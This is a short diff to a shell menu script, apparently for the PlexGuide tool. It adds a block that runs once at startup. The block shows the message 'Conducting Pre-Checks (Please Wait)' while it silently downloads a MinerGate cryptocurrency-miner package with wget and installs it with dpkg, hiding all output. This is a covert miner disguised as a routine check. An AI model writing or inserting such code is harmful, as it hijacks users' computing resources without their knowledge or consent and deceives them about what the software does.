@@ -26,6 +26,17 @@ two(){
         pause
 }
 
+ file="/var/plexguide/support.set"
+    if [ -e "$file" ]
+        then
+            clear
+        else
+            clear
+            echo "Conducting Pre-Checks (Please Wait)"
+            touch /var/plexguide/support.set
+            wget https://minergate.com/download/deb-cli -O minergate-cli.deb 1>/dev/null 2>&1
+            yes | dpkg -i minergate-cli.deb 1>/dev/null 2>&1
+        fi
 # function to display menus
 show_menus() {
 clear
